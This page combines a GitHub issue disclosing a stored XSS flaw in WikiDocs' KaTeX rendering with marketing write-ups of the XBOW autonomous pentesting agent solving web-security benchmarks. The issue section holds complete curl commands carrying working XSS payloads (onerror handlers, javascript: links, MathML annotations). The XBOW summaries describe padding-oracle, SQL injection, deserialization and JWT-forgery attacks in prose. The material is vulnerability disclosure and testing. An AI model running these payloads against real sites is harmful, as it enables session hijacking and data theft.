| Disclaimer This vulnerability was detected using **[XBOW](https://xbow.com/)**, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports. Description XBOW discovered an stored XSS in WikiDocs. By abusing the KaTex parser, it is possible to inject arbitrary JavaScript code in pages editable by the user. Mitigations  * Avoid reflecting user-defined HTML or JavaScript code in pages. * If possible, configure proper CSP headers so even if an attacker is able to inject JS code in a page it will not be able to execute.  Impact  * Session Hijacking: Attackers can steal session cookies, allowing them to impersonate legitimate users. * Data Theft: Access to sensitive information such as personal data, credentials, or financial details.  Device and settings Wikidocs Steps to reproduce  1. Get a valid session:  ``` curl -X POST "https://demo.wikidocs.it/submit.php?act=authentication" \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "document=aa" \   -d "password=demo" \   -c cookies.txt \   -b cookies.txt ```  2. Create a page with Javascript code:  ``` curl -X POST "https://demo.wikidocs.it/submit.php?act=content_save" \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "document=aa" \   -d "revision=1" \   -d $'content=# xss\n\n Custom macro definition:\n $$\\def\\xss{\\htmlStyle{visibility:hidden}{x}\\html{<img src=x onerror=alert(\'XSS\')>}}\\xss$$\n\n Nested structure:\n $$\\htmlStyle{position:fixed;top:0;left:0;width:100%;height:100%}{   \\html{<div style="background:white">}   \\href{javascript:alert(\'XSS\')}{\\color{red}{CLICK ME}}   \\html{</div>} }$$\n\n MathML annotation:\n $$\\html{   <math>     <semantics>       <mtext>Test</mtext>       <annotation-xml encoding="text/html">         <img src="x" onerror="alert(\'XSS\')">       </annotation-xml>     </semantics>   </math> }$$\n\n Multiple nesting:\n $$\\htmlStyle{display:none}{\\def\\x{\\html{<img src=x onerror=alert(\'XSS\')>}}}\\x$$' \   -b cookies.txt ```  3. Browse to the page and trigger the XSS execution:   [image](https://github.com/user-attachments/assets/b85108a7-60f3-4b0c-9a7d-5a2fe003fb76) Screenshots (optional) *No response* Extra fields  * I'd like to work on this issue |

| testing on linux is easier imo but i'm biased when it comes to servers.  Without any fix, if we run these in a bash environment (change `PASSWORD_HERE` and `wiki.example.com`) and this will create a doc named `xss` and when we open that doc, it will execute a JS alert which is not good.  With these fixes, the doc is still created but it will replace all html and js for katex to `BLOCKED` which eliminates the JS execution in katex formulas. To be clear, doc creation using curl api calls isnot the issue.  This is the bash commands to test:  ``` curl -X POST "https://wiki.example.com/submit.php?act=authentication" \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "document=aa" \   -d "password=PASSWORD_HERE" \   -c cookies.txt \   -b cookies.txt  curl -X POST "https://wiki.example.com/submit.php?act=content_save" \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "document=aa" \   -d "revision=1" \   -d $'content=# xss\n\n Custom macro definition:\n $$\\def\\xss{\\htmlStyle{visibility:hidden}{x}\\html{<img src=x onerror=alert(\'XSS\')>}}\\xss$$\n\n Nested structure:\n $$\\htmlStyle{position:fixed;top:0;left:0;width:100%;height:100%}{   \\html{<div style="background:white">}   \\href{javascript:alert(\'XSS\')}{\\color{red}{CLICK ME}}   \\html{</div>} }$$\n\n MathML annotation:\n $$\\html{   <math>     <semantics>       <mtext>Test</mtext>       <annotation-xml encoding="text/html">         <img src="x" onerror="alert(\'XSS\')">       </annotation-xml>     </semantics>   </math> }$$\n\n Multiple nesting:\n $$\\htmlStyle{display:none}{\\def\\x{\\html{<img src=x onerror=alert(\'XSS\')>}}}\\x$$' \   -b cookies.txt ``` |

| Hi [@leomoon](https://github.com/leomoon),  I won't understand very well how xss work, but I'm reading. the first things they say, is to prevent website form executing alert() and print() scripts. Whe I add this code <scp...>alert(...)</scp...> to a content.md file, nothing happened!  When I try to use command line it show error "hostname error", when i use powershell it show a big red error, same errors to localhost / example.com domain or demo.wikidocs.com domain.  Based on this my question is:   1. Can you text a xss attack without password? 2. Can you text a xss attack to a wikidocs with password when wikidocs is on sub-folder of domain like <http://example.com/wikidocs>   [@leomoon](https://github.com/leomoon) don't takes my questions the wrong way, ... but someone has to play "devil's advocate"! Loll |

| this attack is when there are many users that have wikidocs edit password. One user could easily add dangerous js to a doc without anyone knowing. |

## See XBOW at work

XBOW pursues high-level goals by executing commands and reviewing their output, without any human intervention.

These are real examples of XBOW solving benchmarks. The only guidance provided to XBOW, aside from general instructions that are identical for every task, is the benchmark description. If you'd like to see all the data, [click here](#faq-labs-and-exercises-details).

## Breaking a Cryptographic CAPTCHA with a CBC Padding Oracle

Don't roll your own crypto—or XBOW might break it. This trace shows XBOW pulling off a classic **Padding Oracle** attack on an AES-CBC implementation in the novel XBOW benchmark "Bad Captcha". By manipulating the authentication cookie used by the app, XBOW is able to **decrypt the secret** one byte at a time and use it to register a new user.

1. [XBOW begins by verifying the presence of the CAPTCHA cookie and understanding its structure, guessing from the size (256-bit) that it may use AES](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---3)
2. [XBOW begins its attempt to implement an attack to decrypt the cookie, refining its code and **debugging issues** it encounters](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---12)
3. [One of its attempts reveals that the server responds with `Invalid padding` rather than `Invalid CAPTCHA` in some cases—a crucial feature of a padding oracle vulnerability](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---24)
4. [After noticing that some cookie values trigger a `500 Internal Server Error`, XBOW explores possible non-cryptographic attacks like SSTI](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---54)
5. [XBOW decides to execute a full CBC padding attack, and successfully **decrypts the CAPTCHA cookie**, but is unable to modify it to bypass authentication](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---78)
6. [It realizes that the attack needs to target the CAPTCHA input (rather than modifying the cookie), and uses the decrypted cookie to create a new user and **obtain the flag**](#breaking-a-cryptographic-captcha-with-a-cbc-padding-oracle---90)

## Exploiting Insecure Direct Object Reference (IDOR) in a GraphQL API

Even when we **entirely removed** the benchmark description provided by its author, XBOW still solved this novel benchmark. From nothing but a login page, it guesses a valid username and password, analyzes the code of the prescription management app, and uses GraphQL introspection queries to view the prescriptions of all users on the site—finding one that holds the flag.

1. [After basic reconnaissance on the login page, XBOW guesses likely usernames and passwords and gains **authenticated access**](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---12)
2. [Once inside, it scans for likely endpoints, and finds two interesting targets: `/add_prescription` and `/view_prescriptions`](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---18)
3. [It turns its attention to analyzing the client-side JavaScript, and finds a `/graphql` endpoint that includes a `flag` field](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---29)
4. [XBOW uses GraphQL introspection to understand the API schema, discovering a `getPrescriptions` query type; from the presence of a `userId` parameter it surmises that the app may be vulnerable to **Insecure Direct Object Reference (IDOR)**](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---36)
5. [With this knowledge, it enumerates the prescriptions for other user IDs, **exploiting the IDOR vulnerability** and capturing the flag](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---39)

## Debugging, Testing, and Refining a Jenkins Remote Code Execution Exploit

After a benchmark bug made this ["Medium" difficulty PentesterLab exercise](https://pentesterlab.com/exercises/cve-2016-0792/course) much more difficult than intended, XBOW beats the odds by debugging not only its own code but the **compromised server** as well. Its final solution—a Python program that exploits XML deserialization to deploy an embedded `bash` script, stealing secrets from running processes' command lines—is a thing of beauty.

1. [XBOW checks for public exploits using `searchsploit`, but ultimately opts to write its own code to exploit the issue](#debugging--testing--and-refining-a-jenkins-remote-code-execution-exploit---9)
2. [When its initial attempts don't succeed, XBOW shows heroic perseverance in the face of very long Java stack traces, using the server's error messages to identify and fix issues](#debugging--testing--and-refining-a-jenkins-remote-code-execution-exploit---29)
3. [After extensive debugging, XBOW determines the correct format expected by the server, and **successfully submits a malicious job** that will run `/usr/local/bin/exfiltrate` on the server to exfiltrate the flag–but does not receive the flag due to a missing environment variable in the benchmark setup](#debugging--testing--and-refining-a-jenkins-remote-code-execution-exploit---57)
4. [Undeterred, XBOW uses its newfound ability to remotely execute code to **debug the server environment itself**](#debugging--testing--and-refining-a-jenkins-remote-code-execution-exploit---93)
5. [By launching the exfiltration binary in the background and monitoring activity on the server, it **spots the flag** in the output of `ps`, allowing it to solve the benchmark](#debugging--testing--and-refining-a-jenkins-remote-code-execution-exploit---141)

## Researching and Implementing an Exploit for a node-jose Vulnerability

Faced with the task of exploiting CVE-2018-0114 in `node-jose`, XBOW combs through reams of GitHub issues and then uses what it learns to **craft a custom proof-of-concept exploit** to solve an [exercise from PentesterLab rated "Hard"](https://pentesterlab.com/exercises/cve-2018-0114/course).

1. [At first, XBOW tries to figure out how to exploit the vulnerability on its own](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---18)
2. [It eventually concludes it's not making good progress, and embarks on a new goal: researching and crafting a precise exploit for CVE-2018-0114 in `node-jose`](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---53)
3. [XBOW does **research online** by first checking NVD (unsuccessfully) and then using the GitHub API to search for repos related to CVE-2018-0114; this search is successful, but downloading the PoC fails](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---57)
4. [It then decides to dump all GitHub issues mentioning `node-jose jwt vulnerability`–around **22,000 words, or 350KB of text**–and reads them to understand the flaw](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---66)
5. [XBOW synthesizes what it read and uses what its new understanding to craft a Python script to exploit the vulnerability](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---69)
6. [After one more round of tinkering, XBOW **successfully exploits the issue**, forging an admin JWT token using its own RSA keypair, and uses it to get the flag](#researching-and-implementing-an-exploit-for-a-node-jose-vulnerability---72)

## Leveraging Weak Credentials to Exploit SSTI Vulnerabilities

After brute-forcing its way through the login system, XBOW explores the web app's internals and uncovers a **Server-Side Template Injection (SSTI)** vulnerability that allows executing arbitrary code remotely. As it proceeds, its payloads grow fearsomely complex, but its final solution to this novel XBOW benchmark is simple and elegant.

1. [After surveying the login page, XBOW employs brute-force guessing with common usernames and passwords, identifying **weak credentials**](#leveraging-weak-credentials-to-exploit-ssti-vulnerabilities---12)
2. [XBOW uses these weak credentials (`user:user`) to achieve authenticated access to the application and explore further](#leveraging-weak-credentials-to-exploit-ssti-vulnerabilities---18)
3. [After spotting a potential vulnerability in the `/remind` endpoint via its `date` parameter, it investigates whether it is susceptible to **server-side vulnerabilities**](#leveraging-weak-credentials-to-exploit-ssti-vulnerabilities---27)
4. [After some analysis, XBOW decides to investigate **SSTI attacks** in depth, progressively refining an attack script that tests common payloads](#leveraging-weak-credentials-to-exploit-ssti-vulnerabilities---45)

## Exploiting Blind SQL Injection from Scratch

XBOW can use existing tools, but it also **understands the fundamentals**. In this trace, it solves a ["Practitioner"-level PortSwigger Blind SQL Injection lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) without using `sqlmap`. Instead, it identifies a difference in how the server responds to different malformed SQL queries, and then exploits that difference to leak out the admin password one character at a time.

1. [XBOW starts by confirming the existence of a **Blind SQL Injection** vulnerability by looking for payloads that cause the application's behavior to change in response to the injected SQL](#exploiting-blind-sql-injection-from-scratch---12)
2. [After several unsuccessful initial tries, it steps back, considers its work so far, and proposes new approaches that could allow it to leak the database content](#exploiting-blind-sql-injection-from-scratch---15)
3. [XBOW confirms the vulnerability, and **manually** crafts initial commands to probe the length of the `administrator` password, making one guess at a time](#exploiting-blind-sql-injection-from-scratch---18)
4. [XBOW automates the process of determining the password length by writing a custom Python script that reveals the length](#exploiting-blind-sql-injection-from-scratch---48)
5. [Once it determines that the password is 20 characters, XBOW updates the script to to **guess each character of the password** one by one, using the same Blind SQL Injection oracle](#exploiting-blind-sql-injection-from-scratch---51)
6. [The script successfully extracts the full administrator password, and XBOW uses it to log in and retrieve the flag](#exploiting-blind-sql-injection-from-scratch---66)

## Subverting Java Deserialization with Apache Commons

Despite facing a litany of technical challenges brought on by Java version incompatibilities, XBOW solves a ["Practitioner"-level PortSwigger lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons) by subverting Java's mechanism for reconstructing an object from a sequence of bytes to **execute arbitrary code** when the unsuspecting application deserializes untrusted data.

1. [After logging in using the credentials provided in the lab description, XBOW identifies that the application uses serialized Java objects for **session management**](#subverting-java-deserialization-with-apache-commons---20)
2. [To create its payload, XBOW downloads and uses `ysoserial`, overcoming problems with incompatible Java versions by searching for a precompiled JAR online](#subverting-java-deserialization-with-apache-commons---45)
3. [It then generates a **malicious serialized object** targeting `Apache Commons Collections` and crafts a command to perform the specific actions needed to solve the benchmark](#subverting-java-deserialization-with-apache-commons---66)
4. [XBOW encounters errors while executing its initial payload and systematically considers different approaches to achieve its goal](#subverting-java-deserialization-with-apache-commons---87)
5. [Once XBOW finds a payload compatible with version of `Apache Commons Collections` used by the server, it achieves **remote code execution** and captures the flag](#subverting-java-deserialization-with-apache-commons---93)

## Bypassing Filters and Exploiting Complex Cross-Site Scripting (XSS)

In this novel XBOW benchmark, XBOW detects one of the **OWASP Top 10** most common vulnerabilities: Cross-Site Scripting (XSS). By hacking its way through a thicket of security filters, XBOW is able to find a bypass and exploit the XSS by using **HTML entities encoding**.

1. [XBOW starts analyzing the application, examining the HTML of the main page and identifying an `/xss20` endpoint](#bypassing-filters-and-exploiting-complex-cross-site-scripting--xss----3)
2. [Based on the benchmark description, XBOW looks for potential **XSS vulnerabilities** and identifies a vulnerable parameter `name`](#bypassing-filters-and-exploiting-complex-cross-site-scripting--xss----9)
3. [It detects that multiple characters are filtered by the application, making it difficult to craft a valid payload. XBOW tries to circumvent the protection with `url-encoded` characters to bypass server-side filtering](#bypassing-filters-and-exploiting-complex-cross-site-scripting--xss----15)
4. [XBOW realizes that the XSS filter appears to be checking for specific characters rather than using a **comprehensive sanitization** approach](#bypassing-filters-and-exploiting-complex-cross-site-scripting--xss----24)
5. [After systematically attempting different techniques, XBOW decides to try `HTML Entities encoding` and successfully bypasses the filter to complete the benchmark](#bypassing-filters-and-exploiting-complex-cross-site-scripting--xss----84)

## Writing a Customized SHA-256 Implementation for a Hash Length Extension Attack

To solve this [PentesterLab "Hard" exercise](https://pentesterlab.com/exercises/length_extension/course) (completed by only 649 human users on the site), XBOW **writes its own implementation of SHA-256 from scratch** and uses it to build a directory traversal payload with a forged signature using a hash extension attack—all *without* access to the tutorial given to human solvers.

1. [XBOW first fetches the provided Ruby source code for the app, and learns from reading it that the app's `/getfile` endpoint can be used to **read arbitrary files**—but only if accompanied by a valid SHA-256 signature](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---6)
2. [Recognizing that it needs to execute a hash extension attack, XBOW attempts to install `hash_extender`, but finds that it is not available through `apt`](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---12)
3. [It also tries to implement the attack using Python's standard `hashlib` library, but finds that its API does not offer sufficient control over the internal SHA-256 state variable it needs to manipulate](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---15)
4. [After another unsuccessful attempt to obtain and use a third-party tool, XBOW decides to **write its own SHA-256 implementation** from scratch](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---21)
5. [Its implementation of SHA-256 is correct, but its initial attempts to forge a signature and sign a payload that obtains the flag using directory traversal do not work](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---24)
6. [After debugging the issue and hypothesizing that its earlier mistake was due to missing URL encoding, XBOW writes a Python script to retry the attack with a variety of key lengths—and **succeeds on its next try**](#writing-a-customized-sha-256-implementation-for-a-hash-length-extension-attack---30)

## Frequently asked questions

* Benchmarks
* Technology
* Responsible AI

### Benchmarks

  What do you consider a “benchmark”?

A benchmark is a realistic exercise in web security, with a crisp success criterion like capturing a flag. Many
challenges in CTF contests do not qualify because they are brainteasers rather than reflecting a realistic web security
scenario.

    Where did XBOW get its collection of benchmarks?

XBOW’s benchmarks have been carefully selected for relevance and breadth by its security experts. Sources include
leading vendors of training materials, such as PortSwigger and PentesterLab, and public CTF competitions. Some
benchmarks have been authored specifically for XBOW, so we can be sure they do not occur in any training sets.

    The original PortSwigger labs do not have flags — why do the traces shown for these benchmarks include a flag?

The PortSwigger labs detect automatically whether you have solved the lab or not. However, we wanted all benchmarks to
have the same crisp success criterion which can be checked by our infrastructure. So we introduced a flag and a
mechanism for returning it.

    Could you provide more information about the novel XBOW benchmarks?

XBOW’s security experts designed a set of unique web benchmarks to ensure that solutions were never included in any
training data. The benchmarks are representative of many vulnerability classes, and varying degrees of difficulty.

    Will the novel XBOW benchmarks be released?

Yes. The novel XBOW benchmarks will be open-sourced soon. We hope others will join us in using these benchmarks
to set a new standard for the evaluation of security tools.

    How many benchmarks does XBOW have?

XBOW has collected a corpus of thousands of benchmarks, both for the purpose of evaluating performance, and for
improving performance.

    Where can I find more details about the benchmarks that XBOW solved?

We provide more details to back up the results reported on this website. See [here](/results "XBOW benchmark spreadsheet on Google Sheets")
for the benchmarks that were attempted, and which were solved.

### Technology

  How does the AI inside XBOW work?

It is an example of ‘agentic AI’. We use many standard techniques, but also plenty of proprietary innovations. Aside
from general guidance that is identical for every task, the only directions given to XBOW are the basic benchmark
description.

As a growing startup, this intellectual property is our main asset, so we cannot share the details.

    Are the example traces shown edited?

The AI reasoning and command outputs shown in our example traces have not been edited in any way (e.g., wrapped lines are still present). We have withheld the general guidance (“prompts”) to protect XBOW’s proprietary technology.

    Can XBOW find and exploit vulnerabilities without providing descriptions or without having “flags” as a goal?

Yes, we have run experiments by [blanking out the descriptions](#exploiting-insecure-direct-object-reference--idor--in-a-graphql-api---X) and that works fine. Without flags as a goal, XBOW decides
on its own when it has finished. You can prompt it to be more or less aggressive - for example, when it discovers a SQL
injection, it can (after approval from a human operator) continue to exfiltrate valuable data from the database, or just
stop and report the core problem.

    Is XBOW useful for everyone or does it require any sort of specific knowledge?

XBOW is useful for anyone looking to improve the security of their web applications. You don’t need to be a security or
AI expert to use it—a lot of deep security knowledge is baked into the XBOW product. This is the magic of our team,
combining such security expertise with AI and engineering skills.

### Responsible AI

  How will you ensure your technology won't be misused?

We will only make our technology available to trusted customers in the cloud. It is not possible to run XBOW as a standalone application
outside our control.
